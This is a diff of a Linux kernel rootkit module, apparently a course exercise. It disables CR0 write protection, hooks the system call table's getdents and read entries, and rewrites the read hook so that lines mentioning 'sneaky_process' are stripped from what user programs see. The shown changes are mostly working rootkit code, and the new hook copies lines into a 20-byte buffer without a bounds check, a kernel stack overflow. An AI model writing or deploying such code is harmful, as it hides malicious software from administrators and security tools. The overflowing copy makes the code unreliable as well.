@@ -9,15 +9,12 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
-
 struct linux_dirent {
   u64 d_ino;
   s64 d_off;
   unsigned short d_reclen;
   char d_name[];
 };
-
-
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -95,32 +92,31 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, 
 
 //read
 asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count);
- 
+
 asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
   int nread = original_read(fd, buf, count);
   int remain = nread;
-  char * temp  = buf;
-  while (remain > 0) {
-    char * p = strchr(buf, '\n');
-    remain -= (p - temp + 1);
+  char * head = buf;
+  char * newline = NULL;
 
+  while ((newline = strchr(head, '\n')) != NULL) {
+    char line[20];
+    strncpy(line, head, newline - head + 1);
+    line[newline - head + 1] = '\0';
+    remain -= strlen(line);
 
-    if (p != NULL) {
-      char line[50];
-      strncpy(line, temp, p - temp + 1);
-      if (strstr(line, "sneaky_process") != NULL) {
-	nread -= (p - temp + 1);
-        memmove(temp, p + 1, remain);
-      }
+    if (strstr(line, "sneaky_process") != NULL) {
+      nread -= strlen(line);
+      memmove(head, newline + 1, remain);
     } else {
-      if (strstr(temp, "sneaky_process") != NULL) {
-	return temp - buf;
-      }
+      head = newline + 1;
     }
-
-    temp = p + 1;
   }
-  return nread;
+
+  if (strstr(head, "sneaky_process") != NULL) {
+    nread -= strlen(head);
+  }
+  return (ssize_t)nread;
 }
 
 //The code that gets executed when the module is loaded
@@ -160,14 +156,12 @@ static int initialize_sneaky_module(void)
   return 0;       // to show a successful load 
 }  
 
-
 static void exit_sneaky_module(void) 
 {
   struct page *page_ptr;
   printk(KERN_INFO "Sneaky module being unloaded.\n"); 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
-
   //Get a pointer to the virtual page containing the address
   //of the system call table in the kernel.
   page_ptr = virt_to_page(&sys_call_table);
@@ -183,7 +177,6 @@ static void exit_sneaky_module(void)
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
 }  
-
 
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
